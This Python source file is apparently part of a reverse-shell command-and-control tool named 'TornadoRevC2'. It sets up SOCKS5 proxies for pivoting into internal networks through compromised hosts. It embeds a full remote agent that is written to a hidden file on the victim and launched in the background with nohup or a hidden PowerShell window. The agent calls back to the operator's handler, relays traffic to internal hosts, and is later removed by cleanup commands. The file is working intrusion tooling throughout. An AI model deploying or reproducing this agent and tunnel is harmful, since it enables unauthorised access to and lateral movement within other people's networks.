"""SOCKS5 internal pivoting through reverse shell sessions."""

import base64
import json
import queue
import select
import socket
import struct
import threading
import time

from .constants import TUNNEL_MARK_END, TUNNEL_MARK_START, TUNNEL_REGISTER_MAGIC

TUNNEL_POOL_SIZE = 6
RELAY_CHUNK = 262144
UPLOAD_QUEUE_SIZE = 32
MAX_FRAME = 32 * 1024 * 1024
RELAY_IDLE_TIMEOUT = 8.0
RELAY_ACTIVE_TIMEOUT = 180.0
SOCK_BUF = 4 * 1024 * 1024
FRAME_JSON = 0
FRAME_SEND = 1
FRAME_RECV_REQ = 2
FRAME_RECV_RESP = 3
MAX_IDLE_ROUNDS = 90

_REMOTE_AGENT_SOURCE = r'''
import base64, json, socket, struct, sys, threading, time

CHANNELS = 6
MAX_BUF = 33554432
HIGH_WATER = 25165824
LOW_WATER = 8388608
MAX_FRAME = 33554432
RECV_SIZE = 262144
SOCK_BUF = 4194304

def recv_exact(conn, n):
    data = b''
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data

def recv_frame(conn):
    hdr = recv_exact(conn, 4)
    if not hdr:
        return None
    length = struct.unpack('>I', hdr)[0]
    if length == 0 or length > MAX_FRAME:
        return None
    body = recv_exact(conn, length)
    if not body:
        return None
    typ = body[0]
    if typ == 0:
        return json.loads(body[1:].decode('utf-8'))
    if typ == 1:
        sid = struct.unpack('>I', body[1:5])[0]
        return {'op': 'sendb', 'sid': sid, 'data': body[5:]}
    if typ == 2:
        sid, max_bytes = struct.unpack('>II', body[1:9])
        return {'op': 'recvb', 'sid': sid, 'max': max_bytes}
    return None

def send_json(conn, obj):
    payload = b'\x00' + json.dumps(obj, separators=(',', ':')).encode('utf-8')
    conn.sendall(struct.pack('>I', len(payload)) + payload)

def send_recvb(conn, sid, data, closed):
    body = struct.pack('>BIB', 3, sid, 1 if closed else 0) + data
    conn.sendall(struct.pack('>I', len(body)) + body)

def tune_sock(sock):
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUF)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUF)
    except Exception:
        pass

def detect_handler_ip(revshell_port, fallback='127.0.0.1'):
    try:
        with open('/proc/net/tcp') as fh:
            for line in fh.read().splitlines()[1:]:
                parts = line.split()
                if len(parts) < 4 or parts[3] != '01':
                    continue
                remote = parts[2]
                if int(remote.split(':')[1], 16) != int(revshell_port):
                    continue
                hexip = remote.split(':')[0]
                return '.'.join(str(int(hexip[i:i + 2], 16)) for i in (6, 4, 2, 0))
    except Exception:
        pass
    try:
        import subprocess
        out = subprocess.check_output(
            ['ss', '-H', '-tn', 'state', 'established', f'( dport = :{revshell_port} )'],
            stderr=subprocess.DEVNULL, text=True,
        )
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                peer = parts[3]
                if peer.startswith('['):
                    return peer.split(']')[0][1:]
                return peer.rsplit(':', 1)[0]
    except Exception:
        pass
    if sys.platform == 'win32':
        try:
            import subprocess
            out = subprocess.check_output(['netstat', '-n'], stderr=subprocess.DEVNULL, text=True, errors='ignore')
            for line in out.splitlines():
                if 'ESTABLISHED' in line and f':{revshell_port}' in line:
                    for part in line.split():
                        if part.count('.') == 3 and ':' in part:
                            return part.rsplit(':', 1)[0]
        except Exception:
            pass
    return fallback

def reset_entry(entry):
    with entry['buf_lock']:
        entry['buf'] = b''
    entry['drain'].set()

def gc_streams(streams, lock):
    with lock:
        dead = [sid for sid, e in list(streams.items()) if e.get('closed')]
        for sid in dead:
            entry = streams.pop(sid, None)
            if entry:
                reset_entry(entry)
                try:
                    entry['sock'].close()
                except Exception:
                    pass

def pump(entry):
    sock = entry['sock']
    buf_lock = entry['buf_lock']
    drain = entry['drain']
    sock.settimeout(1.0)
    while not entry.get('closed'):
        with buf_lock:
            buf_len = len(entry['buf'])
        if buf_len >= HIGH_WATER:
            drain.clear()
        if buf_len >= MAX_BUF or not drain.is_set():
            drain.wait(timeout=0.5)
            continue
        try:
            piece = sock.recv(RECV_SIZE)
            if not piece:
                entry['closed'] = True
                reset_entry(entry)
                break
            with buf_lock:
                entry['buf'] += piece
                if len(entry['buf']) >= HIGH_WATER:
                    drain.clear()
                elif len(entry['buf']) <= LOW_WATER:
                    drain.set()
        except socket.timeout:
            continue
        except Exception:
            entry['closed'] = True
            reset_entry(entry)
            break

def read_buf(entry, max_bytes):
    with entry['buf_lock']:
        if entry['buf']:
            chunk = entry['buf'][:max_bytes]
            entry['buf'] = entry['buf'][len(chunk):]
            if len(entry['buf']) <= LOW_WATER:
                entry['drain'].set()
            return chunk, entry['closed']
        return b'', entry['closed']

def close_stream(streams, lock, sid):
    with lock:
        entry = streams.pop(sid, None)
    if entry:
        entry['closed'] = True
        reset_entry(entry)
        try:
            entry['sock'].close()
        except Exception:
            pass

def purge_streams(streams, lock):
    with lock:
        items = list(streams.items())
        streams.clear()
    for _sid, entry in items:
        entry['closed'] = True
        reset_entry(entry)
        try:
            entry['sock'].close()
        except Exception:
            pass

def serve(conn, streams, lock):
    try:
        while True:
            msg = recv_frame(conn)
            if not msg:
                break
            op = msg.get('op')
            sid = msg.get('sid')
            if op == 'ping':
                send_json(conn, {'ok': True, 'op': 'pong'})
            elif op == 'connect':
                host = msg.get('host', '127.0.0.1')
                port = int(msg.get('port', 0))
                close_stream(streams, lock, sid)
                try:
                    remote = socket.create_connection((host, port), timeout=10)
                    tune_sock(remote)
                    entry = {
                        'sock': remote, 'buf': b'', 'buf_lock': threading.Lock(),
                        'drain': threading.Event(), 'closed': False,
                    }
                    entry['drain'].set()
                    with lock:
                        streams[sid] = entry
                    threading.Thread(target=pump, args=(entry,), daemon=True).start()
                    send_json(conn, {'ok': True, 'sid': sid})
                except Exception as exc:
                    send_json(conn, {'ok': False, 'sid': sid, 'error': str(exc)})
            elif op in ('send', 'sendb'):
                data = msg.get('data', b'') if op == 'sendb' else base64.b64decode(msg.get('data', '') or '')
                with lock:
                    entry = streams.get(sid)
                if not entry or entry['closed']:
                    send_json(conn, {'ok': False, 'sid': sid, 'error': 'closed', 'closed': True})
                    continue
                try:
                    entry['sock'].sendall(data)
                    send_json(conn, {'ok': True, 'sid': sid})
                except Exception as exc:
                    entry['closed'] = True
                    reset_entry(entry)
                    send_json(conn, {'ok': False, 'sid': sid, 'error': str(exc), 'closed': True})
            elif op in ('recv', 'recvb'):
                max_bytes = int(msg.get('max', RECV_SIZE))
                with lock:
                    entry = streams.get(sid)
                if not entry:
                    send_json(conn, {'ok': False, 'sid': sid, 'error': 'missing', 'closed': True})
                    continue
                if entry['closed']:
                    reset_entry(entry)
                    if op == 'recvb':
                        send_recvb(conn, sid, b'', True)
                    else:
                        send_json(conn, {'ok': True, 'sid': sid, 'data': '', 'closed': True})
                    continue
                chunk, closed = read_buf(entry, max_bytes)
                if closed:
                    reset_entry(entry)
                if op == 'recvb':
                    send_recvb(conn, sid, chunk, closed)
                else:
                    send_json(conn, {
                        'ok': True, 'sid': sid,
                        'data': base64.b64encode(chunk).decode('ascii'),
                        'closed': closed,
                    })
            elif op == 'close':
                close_stream(streams, lock, sid)
                send_json(conn, {'ok': True, 'sid': sid})
            elif op == 'reset':
                with lock:
                    entry = streams.get(sid)
                if entry:
                    reset_entry(entry)
                    entry['closed'] = True
                    with lock:
                        streams.pop(sid, None)
                    try:
                        entry['sock'].close()
                    except Exception:
                        pass
                send_json(conn, {'ok': True, 'sid': sid})
            elif op == 'gc':
                gc_streams(streams, lock)
                send_json(conn, {'ok': True})
            elif op == 'purge':
                purge_streams(streams, lock)
                send_json(conn, {'ok': True})
            else:
                send_json(conn, {'ok': False, 'error': 'unknown op'})
    finally:
        gc_streams(streams, lock)

def worker(streams, lock, handler_host, handler_port, token):
    while True:
        conn = None
        try:
            conn = socket.create_connection((handler_host, handler_port), timeout=20)
            tune_sock(conn)
            send_json(conn, {'op': 'register', 'token': token, 'magic': 'TornadoRevC2'})
            ack = recv_frame(conn)
            if not ack or not ack.get('ok'):
                conn.close()
                time.sleep(2)
                continue
            serve(conn, streams, lock)
        except Exception:
            pass
        finally:
            if conn:
                try:
                    conn.close()
                except Exception:
                    pass
        time.sleep(1)

def main():
    if len(sys.argv) < 4:
        return
    handler_host = sys.argv[1]
    handler_port = int(sys.argv[2])
    token = sys.argv[3]
    revshell_port = int(sys.argv[4]) if len(sys.argv) > 4 else max(handler_port - 1, 1)
    if handler_host == 'auto':
        handler_host = detect_handler_ip(revshell_port)
    streams = {}
    lock = threading.Lock()
    for _ in range(CHANNELS):
        threading.Thread(
            target=worker, args=(streams, lock, handler_host, handler_port, token), daemon=True,
        ).start()
    while True:
        time.sleep(3600)

if __name__ == '__main__':
    main()
'''


def _set_keepalive(sock):
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUF)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUF)
    except OSError:
        pass


def _recv_exact(conn, n, timeout=15.0):
    conn.settimeout(timeout)
    data = b''
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def _read_frame(conn, timeout=15.0):
    """Read one tunnel frame; return (message_dict_or_None, hard_fail)."""
    conn.settimeout(timeout)
    try:
        hdr = _recv_exact(conn, 4, timeout=timeout)
        if not hdr:
            return None, True
        length = struct.unpack('>I', hdr)[0]
        if length == 0 or length > MAX_FRAME:
            return None, True
        body = _recv_exact(conn, length, timeout=timeout)
        if not body:
            return None, True
        typ = body[0]
        if typ == FRAME_JSON:
            return json.loads(body[1:].decode('utf-8')), False
        if typ == ord('{'):
            return json.loads(body.decode('utf-8')), False
        if typ == FRAME_RECV_RESP:
            sid = struct.unpack('>I', body[1:5])[0]
            closed = bool(body[5])
            return {'op': '_recvb', 'sid': sid, 'data': body[6:], 'closed': closed}, False
        return None, True
    except socket.timeout:
        return None, False
    except (OSError, json.JSONDecodeError):
        return None, True
    finally:
        try:
            conn.settimeout(None)
        except OSError:
            pass


def _send_json(conn, obj):
    payload = b'\x00' + json.dumps(obj, separators=(',', ':')).encode('utf-8')
    conn.sendall(struct.pack('>I', len(payload)) + payload)


def _recv_framed(conn, timeout=15.0):
    msg, hard = _read_frame(conn, timeout=timeout)
    if msg is None:
        return None
    if msg.get('op') == '_recvb':
        return None
    return json.dumps(msg, separators=(',', ':')).encode('utf-8')


def _send_framed(conn, payload_bytes):
    if payload_bytes[:1] == b'{':
        payload = b'\x00' + payload_bytes
    else:
        payload = payload_bytes
    conn.sendall(struct.pack('>I', len(payload)) + payload)


class TunnelManager:
    """Manage SOCKS5 proxies for internal network pivoting through reverse shell sessions."""

    def __init__(self, handler):
        self.h = handler
        self._lock = threading.Lock()
        self._counter = 0
        self._proxies = {}
        self._session_agents = {}
        self._session_pools = {}       # client_sock -> [conn, ...]
        self._conn_locks = {}          # id(conn) -> Lock
        self._channel_load = {}        # id(conn) -> active relay count
        self._channel_rr = {}          # client_sock -> int
        self._token_sessions = {}
        self._channel_ready = {}
        self._session_stream_counters = {}
        self._deploy_locks = {}
        self._tunnel_listener = None
        self._tunnel_port = None
        self._last_error = ''
        self._ensure_tunnel_listener()

    def _ensure_tunnel_listener(self):
        with self._lock:
            if self._tunnel_listener:
                return self._tunnel_port
            base_port = int(self.h.revshell_port) + 1
            last_exc = None
            for port in range(base_port, base_port + 20):
                listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                try:
                    listener.bind(('0.0.0.0', port))
                    listener.listen(128)
                except OSError as exc:
                    last_exc = exc
                    listener.close()
                    continue
                self._tunnel_listener = listener
                self._tunnel_port = port
                threading.Thread(target=self._tunnel_accept_loop, daemon=True).start()
                return port
            raise OSError(last_exc or 'could not bind tunnel listener')

    def _tunnel_accept_loop(self):
        while True:
            try:
                conn, _ = self._tunnel_listener.accept()
                _set_keepalive(conn)
                threading.Thread(target=self._register_tunnel, args=(conn,), daemon=True).start()
            except OSError:
                break

    def _register_tunnel(self, conn):
        try:
            msg, _hard = _read_frame(conn, timeout=20.0)
            if not msg:
                conn.close()
                return
            if msg.get('op') != 'register' or msg.get('magic') != TUNNEL_REGISTER_MAGIC:
                conn.close()
                return
            token = msg.get('token')
            session_sock = self._token_sessions.get(token)
            if not session_sock:
                conn.close()
                return
            with self._lock:
                pool = self._session_pools.setdefault(session_sock, [])
                pool[:] = [c for c in pool if self._conn_alive(c)]
                if len(pool) >= TUNNEL_POOL_SIZE:
                    conn.close()
                    return
                pool.append(conn)
                self._conn_locks.setdefault(id(conn), threading.Lock())
                self._channel_load.setdefault(id(conn), 0)
            _send_json(conn, {'ok': True})
            ready = self._channel_ready.get(token)
            if ready:
                ready.set()
            n = len(self._session_pools.get(session_sock, []))
            self._log(session_sock, f"Tunnel channel registered ({n}/{TUNNEL_POOL_SIZE})")
        except Exception:
            try:
                conn.close()
            except OSError:
                pass

    def _alive_conns(self, client_sock):
        pool = self._session_pools.get(client_sock, [])
        alive = []
        for c in pool:
            try:
                if c.fileno() != -1:
                    alive.append(c)
            except OSError:
                pass
        if len(alive) != len(pool):
            self._session_pools[client_sock] = alive
        return alive

    def _has_channels(self, client_sock):
        return bool(self._alive_conns(client_sock))

    def _conn_lock(self, conn):
        key = id(conn)
        with self._lock:
            if key not in self._conn_locks:
                self._conn_locks[key] = threading.Lock()
            return self._conn_locks[key]

    def _pick_channel(self, client_sock):
        alive = self._alive_conns(client_sock)
        if not alive:
            return None
        with self._lock:
            idx = self._channel_rr.get(client_sock, 0) % len(alive)
            self._channel_rr[client_sock] = idx + 1
        return alive[idx]

    def _inc_channel_load(self, conn, amount=1):
        if conn is None:
            return
        with self._lock:
            key = id(conn)
            self._channel_load[key] = max(0, self._channel_load.get(key, 0) + amount)

    def _channel_load_value(self, conn):
        with self._lock:
            return self._channel_load.get(id(conn), 0)

    def _remove_conn(self, client_sock, conn):
        with self._lock:
            pool = self._session_pools.get(client_sock, [])
            if conn in pool:
                pool.remove(conn)
            self._conn_locks.pop(id(conn), None)
            self._channel_load.pop(id(conn), None)
        try:
            conn.close()
        except OSError:
            pass

    def _drop_pool(self, client_sock):
        for conn in self._alive_conns(client_sock):
            self._remove_conn(client_sock, conn)
        with self._lock:
            self._session_pools.pop(client_sock, None)
            self._channel_rr.pop(client_sock, None)

    def _pick_two_channels(self, client_sock):
        alive = self._alive_conns(client_sock)
        if not alive:
            return None, None
        if len(alive) == 1:
            return alive[0], alive[0]
        ranked = sorted(alive, key=lambda c: self._channel_load_value(c))
        up = ranked[0]
        down = ranked[1] if ranked[1] is not up else ranked[0]
        if up is down and len(ranked) > 2:
            down = ranked[2]
        with self._lock:
            self._channel_rr[client_sock] = self._channel_rr.get(client_sock, 0) + 2
        return up, down

    def _close_stream_on_agent(self, client_sock, sid, preferred=None):
        """Tell the agent to close a stream and discard any buffered data."""
        self._channel_request(
            client_sock, {'op': 'close', 'sid': sid}, timeout=3.0, preferred=preferred,
        )
        self._channel_request(
            client_sock, {'op': 'reset', 'sid': sid}, timeout=3.0, preferred=preferred,
        )

    def _wait_for_channel(self, client_sock, token, timeout=30.0):
        ready = self._channel_ready.get(token)
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self._has_channels(client_sock):
                return True
            if ready and ready.wait(timeout=min(0.2, max(deadline - time.time(), 0))):
                if self._has_channels(client_sock):
                    return True
        return self._has_channels(client_sock)

    def _request_on(self, conn, message, timeout=30.0):
        """Send one JSON request; return (response, hard_fail)."""
        if not self._conn_alive(conn):
            return None, True
        lock = self._conn_lock(conn)
        with lock:
            try:
                if not self._conn_alive(conn):
                    return None, True
                conn.settimeout(timeout)
                _send_json(conn, message)
                resp, hard_fail = _read_frame(conn, timeout=timeout)
                return resp, hard_fail
            except socket.timeout:
                return None, False
            except OSError:
                return None, True
            finally:
                try:
                    conn.settimeout(None)
                except OSError:
                    pass

    def _send_bulk(self, conn, sid, data, timeout=RELAY_ACTIVE_TIMEOUT):
        if not self._conn_alive(conn):
            return False, True
        lock = self._conn_lock(conn)
        with lock:
            try:
                body = struct.pack('>BI', FRAME_SEND, sid) + data
                conn.settimeout(timeout)
                conn.sendall(struct.pack('>I', len(body)) + body)
                resp, hard_fail = _read_frame(conn, timeout=timeout)
                if resp is None:
                    return False, hard_fail
                return bool(resp.get('ok')), False
            except socket.timeout:
                return False, False
            except OSError:
                return False, True
            finally:
                try:
                    conn.settimeout(None)
                except OSError:
                    pass

    def _recv_bulk(self, conn, sid, max_bytes=RELAY_CHUNK, timeout=RELAY_IDLE_TIMEOUT):
        if not self._conn_alive(conn):
            return b'', False, True
        lock = self._conn_lock(conn)
        with lock:
            try:
                body = struct.pack('>BII', FRAME_RECV_REQ, sid, max_bytes)
                conn.settimeout(timeout)
                conn.sendall(struct.pack('>I', len(body)) + body)
                resp, hard_fail = _read_frame(conn, timeout=timeout)
                if resp is None:
                    return b'', False, hard_fail
                if resp.get('op') == '_recvb':
                    return resp.get('data', b''), bool(resp.get('closed')), False
                if resp.get('ok'):
                    chunk = base64.b64decode(resp.get('data', '') or '')
                    return chunk, bool(resp.get('closed')), False
                return b'', bool(resp.get('closed')), False
            except socket.timeout:
                return b'', False, False
            except OSError:
                return b'', False, True
            finally:
                try:
                    conn.settimeout(None)
                except OSError:
                    pass

    def _channel_request(self, client_sock, message, timeout=30.0, preferred=None):
        tried = set()
        candidates = []
        if preferred is not None and self._conn_alive(preferred):
            candidates.append(preferred)
        for _ in range(TUNNEL_POOL_SIZE):
            ch = self._pick_channel(client_sock)
            if ch and id(ch) not in tried:
                candidates.append(ch)
                tried.add(id(ch))
        for conn in candidates:
            resp, hard_fail = self._request_on(conn, message, timeout=timeout)
            if resp is not None:
                return resp, conn
            if hard_fail:
                self._remove_conn(client_sock, conn)
        return None, None

    def _next_id(self, prefix):
        with self._lock:
            self._counter += 1
            return f"{prefix}{self._counter}"

    def _next_stream_id(self, client_sock):
        with self._lock:
            sid = self._session_stream_counters.get(client_sock, 0) + 1
            self._session_stream_counters[client_sock] = sid
            return sid

    def _deploy_lock(self, client_sock):
        with self._lock:
            if client_sock not in self._deploy_locks:
                self._deploy_locks[client_sock] = threading.Lock()
            return self._deploy_locks[client_sock]

    def _log(self, client_sock, message):
        logger = self.h._get_session_logger(client_sock)
        if logger:
            logger.log_tunnel(message)

    def _agent_token(self, client_sock):
        info = self.h._client_info(client_sock)
        return f"s{info['id']}" if info else None

    def _set_error(self, message):
        self._last_error = message

    def _tunnel_marked(self, client_sock, unix_cmd, win_ps_script, shell_type, timeout=15.0, strip_ws=True):
        return self.h._run_marked(
            client_sock, unix_cmd, win_ps_script, shell_type, timeout=timeout,
            start_mark=TUNNEL_MARK_START, end_mark=TUNNEL_MARK_END, strip_ws=strip_ws,
        )

    def _remote_paths(self, client_sock, shell_type, token):
        name = f".tornado_agent_{token}.py"
        if shell_type == 'windows':
            return self.h.inmemory.resolve_staging_path(client_sock, shell_type, name)
        return f"/tmp/.tornado_agent_{token}.py"

    def _upload_agent(self, client_sock, agent_path, shell_type):
        data = _REMOTE_AGENT_SOURCE.encode('utf-8')
        chunk_size = self.h._write_chunk_size(agent_path, shell_type)
        for offset in range(0, len(data), chunk_size):
            if not self.h._remote_write_chunk(
                client_sock, agent_path, data[offset:offset + chunk_size], shell_type,
                truncate=(offset == 0), skip_flush=(offset > 0),
            ):
                self._set_error('failed to upload tunnel agent')
                return False
        return True

    def _deploy_agent(self, client_sock):
        if self._session_agents.get(client_sock, {}).get('ready') and self._has_channels(client_sock):
            return self._session_agents[client_sock]

        info = self.h._client_info(client_sock)
        if not info:
            self._set_error('session not active')
            return None

        self._ensure_tunnel_listener()
        shell_type = info.get('type', 'unix')
        token = self._agent_token(client_sock)
        tunnel_port = self._tunnel_port
        revshell_port = int(self.h.revshell_port)
        agent_path = self._remote_paths(client_sock, shell_type, token)
        path_esc = self.h._escape_path(agent_path, shell_type)
        token_esc = token.replace("'", "'\\''")

        self._token_sessions[token] = client_sock
        ready = threading.Event()
        self._channel_ready[token] = ready
        ready.clear()
        self._drop_pool(client_sock)

        if not self._upload_agent(client_sock, agent_path, shell_type):
            return None

        if shell_type == 'windows':
            deploy_ps = (
                f"$p='{path_esc}';"
                f"$py=(Get-Command python -ErrorAction SilentlyContinue).Source;"
                f"if(-not $py){{$py=(Get-Command python3 -ErrorAction SilentlyContinue).Source}};"
                f"if(-not $py){{'{TUNNEL_MARK_START}NO_PYTHON{TUNNEL_MARK_END}';return}};"
                f"Get-CimInstance Win32_Process -Filter \"CommandLine LIKE '%.tornado_agent_{token}.py%'\" "
                f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }};"
                f"Start-Process -FilePath $py -ArgumentList @($p,'auto',{tunnel_port},'{token}',{revshell_port}) "
                f"-WindowStyle Hidden | Out-Null;"
                f"'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
            )
            payload = self._tunnel_marked(client_sock, '', deploy_ps, 'windows', timeout=25.0)
        else:
            unix_cmd = (
                f"PY=$(command -v python3 2>/dev/null || command -v python 2>/dev/null); "
                f"pkill -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
                f"if [ -z \"$PY\" ]; then printf '%sNO_PYTHON%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'; exit 0; fi; "
                f"nohup \"$PY\" '{path_esc}' auto {tunnel_port} '{token_esc}' {revshell_port} >/dev/null 2>&1 & "
                f"printf '%sOK%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
            )
            payload = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=25.0)

        if payload == 'NO_PYTHON':
            self._set_error('Python not installed on remote host')
            return None
        if payload != 'OK':
            self._set_error('tunnel agent failed to start')
            return None
        if not self._wait_for_channel(client_sock, token, timeout=30.0):
            self._set_error(f'agent did not connect to handler port {tunnel_port}')
            return None

        agent = {'token': token, 'ready': True, 'remote_path': agent_path}
        self._session_agents[client_sock] = agent
        self._last_error = ''
        n = len(self._alive_conns(client_sock))
        self._log(client_sock, f"Tunnel ready: {n} channel(s) on port {tunnel_port}")
        self._start_keepalive(client_sock, agent)
        return agent

    def _start_keepalive(self, client_sock, agent):
        def loop():
            gc_counter = 0
            while (
                client_sock in self.h.revshell_clients
                and self._session_agents.get(client_sock) is agent
            ):
                time.sleep(30)
                if not self._has_channels(client_sock):
                    self._wait_for_channel(client_sock, agent['token'], timeout=10.0)
                    continue
                self._channel_request(client_sock, {'op': 'ping'}, timeout=10.0)
                gc_counter += 1
                if gc_counter >= 4:
                    gc_counter = 0
                    self._channel_request(client_sock, {'op': 'gc'}, timeout=10.0)
        threading.Thread(target=loop, daemon=True).start()

    def _agent_request(self, client_sock, message, timeout=30.0, preferred=None):
        agent = self._session_agents.get(client_sock)
        if not agent or not agent.get('ready'):
            with self._deploy_lock(client_sock):
                agent = self._session_agents.get(client_sock)
                if not agent or not agent.get('ready'):
                    agent = self._deploy_agent(client_sock)
        if not agent:
            return None
        if not self._has_channels(client_sock):
            self._wait_for_channel(client_sock, agent['token'], timeout=10.0)
        resp, conn = self._channel_request(
            client_sock, message, timeout=timeout, preferred=preferred,
        )
        if resp is not None:
            return resp
        self._wait_for_channel(client_sock, agent['token'], timeout=8.0)
        resp, _ = self._channel_request(client_sock, message, timeout=timeout)
        return resp

    def _cleanup_remote_tunnel_artifacts(self, client_sock, reason='cleanup'):
        agent = self._session_agents.get(client_sock)
        info = self.h._client_info(client_sock)
        if not agent and not info:
            self._drop_pool(client_sock)
            return False

        shell_type = (info or {}).get('type', 'unix')
        token = (agent or {}).get('token') or self._agent_token(client_sock)
        if not token:
            self._drop_pool(client_sock)
            return False

        agent_path = (agent or {}).get('remote_path') or self._remote_paths(client_sock, shell_type, token)
        path_esc = self.h._escape_path(agent_path, shell_type)
        token_esc = token.replace("'", "'\\''")

        if shell_type == 'windows':
            cleanup_ps = (
                f"Get-CimInstance Win32_Process -Filter \"CommandLine LIKE '%.tornado_agent_{token}.py%'\" "
                f"| ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }};"
                f"Remove-Item -LiteralPath '{path_esc}' -Force -ErrorAction SilentlyContinue;"
                f"'{TUNNEL_MARK_START}OK{TUNNEL_MARK_END}'"
            )
            result = self._tunnel_marked(client_sock, '', cleanup_ps, 'windows', timeout=20.0)
        else:
            unix_cmd = (
                f"pkill -f '.tornado_agent_{token_esc}.py' 2>/dev/null; "
                f"rm -f '{path_esc}' 2>/dev/null; "
                f"printf '%sOK%s' '{TUNNEL_MARK_START}' '{TUNNEL_MARK_END}'"
            )
            result = self._tunnel_marked(client_sock, unix_cmd, '', shell_type, timeout=20.0)

        self._drop_pool(client_sock)
        with self._lock:
            self._session_agents.pop(client_sock, None)
            self._token_sessions.pop(token, None)
            self._channel_ready.pop(token, None)
            self._session_stream_counters.pop(client_sock, None)
            self._deploy_locks.pop(client_sock, None)

        ok = result == 'OK'
        msg = f"Remote tunnel cleanup ({reason}): {'removed' if ok else (result or 'no response')}"
        color = self.h.colors['green'] if ok else self.h.colors['yellow']
        print(f"{color}{msg}{self.h.colors['end']}")
        self._log(client_sock, msg)
        return ok

    def cleanup_session(self, client_sock):
        for pid, p in list(self._proxies.items()):
            if p.get('client_sock') == client_sock:
                self._stop_proxy(pid, reason='session disconnected', cleanup_remote=False)
        self._channel_request(client_sock, {'op': 'purge'}, timeout=5.0)
        self._cleanup_remote_tunnel_artifacts(client_sock, reason='session disconnected')

    def start_socks(self, client_sock, listen_port):
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
            return False
        try:
            listen_port = int(listen_port)
        except ValueError:
            print(f"{self.h.colors['red']}Invalid port{self.h.colors['end']}")
            return False

        if not self._agent_request(client_sock, {'op': 'ping'}, timeout=25.0):
            print(f"{self.h.colors['red']}Failed to start tunnel: {self._last_error or 'no response'}{self.h.colors['end']}")
            return False

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind(('127.0.0.1', listen_port))
            listener.listen(512)
        except OSError as exc:
            listener.close()
            print(f"{self.h.colors['red']}Cannot bind 127.0.0.1:{listen_port}: {exc}{self.h.colors['end']}")
            return False

        proxy_id = self._next_id('socks')
        stop_event = threading.Event()
        proxy = {
            'id': proxy_id, 'client_sock': client_sock, 'session_id': info['id'],
            'listen_port': listen_port, 'listener': listener, 'stop_event': stop_event,
        }
        with self._lock:
            self._proxies[proxy_id] = proxy

        def accept_loop():
            while not stop_event.is_set():
                try:
                    listener.settimeout(1.0)
                    try:
                        conn, _ = listener.accept()
                    except socket.timeout:
                        continue
                    _set_keepalive(conn)
                    threading.Thread(
                        target=self._handle_socks_client, args=(client_sock, conn), daemon=True,
                    ).start()
                except OSError:
                    break

        threading.Thread(target=accept_loop, daemon=True).start()
        n = len(self._alive_conns(client_sock))
        print(f"{self.h.colors['green']}SOCKS5 {proxy_id}: 127.0.0.1:{listen_port} via #{info['id']} ({n} ch){self.h.colors['end']}")
        print(f"{self.h.colors['cyan']}  proxychains: proxy_dns + socks5 127.0.0.1 {listen_port}{self.h.colors['end']}")
        print(f"{self.h.colors['cyan']}  test reachability: socks test <host> <port>{self.h.colors['end']}")
        return True

    def _socks_reset(self, client_sock):
        """Reset tunnel agent streams and discard buffered data without stopping SOCKS listeners."""
        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
            return True
        if not self._has_channels(client_sock):
            print(f"{self.h.colors['red']}No active tunnel channels for #{info['id']}{self.h.colors['end']}")
            return True
        resp, _conn = self._channel_request(client_sock, {'op': 'purge'}, timeout=10.0)
        if resp and resp.get('ok'):
            print(
                f"{self.h.colors['green']}Tunnel reset OK for #{info['id']} "
                f"(streams and buffers cleared){self.h.colors['end']}"
            )
            self._log(client_sock, 'SOCKS tunnel reset: streams and buffers cleared')
        else:
            err = self._last_error or 'no response'
            print(f"{self.h.colors['red']}Tunnel reset failed for #{info['id']}: {err}{self.h.colors['end']}")
            self._log(client_sock, f'SOCKS tunnel reset failed: {err}')
        return True

    def _socks_test(self, client_sock, host, port):
        """Test TCP reachability to an internal host through the tunnel agent."""
        try:
            port = int(port)
        except (TypeError, ValueError):
            print(f"{self.h.colors['red']}Invalid port{self.h.colors['end']}")
            return True

        info = self.h._client_info(client_sock)
        if not info:
            print(f"{self.h.colors['red']}Session not active{self.h.colors['end']}")
            return True

        sid = self._next_stream_id(client_sock)
        started = time.time()
        resp = self._agent_request(
            client_sock,
            {'op': 'connect', 'sid': sid, 'host': host, 'port': port},
            timeout=45.0,
        )
        elapsed = time.time() - started
        if resp and resp.get('ok'):
            print(
                f"{self.h.colors['green']}OK: {host}:{port} via #{info['id']} "
                f"({elapsed:.2f}s){self.h.colors['end']}"
            )
            self._log(client_sock, f"SOCKS test OK: {host}:{port} ({elapsed:.2f}s)")
            self._agent_request(client_sock, {'op': 'close', 'sid': sid}, timeout=5.0)
        else:
            err = (resp or {}).get('error', self._last_error or 'no response')
            print(
                f"{self.h.colors['red']}FAIL: {host}:{port} via #{info['id']} — {err} "
                f"({elapsed:.2f}s){self.h.colors['end']}"
            )
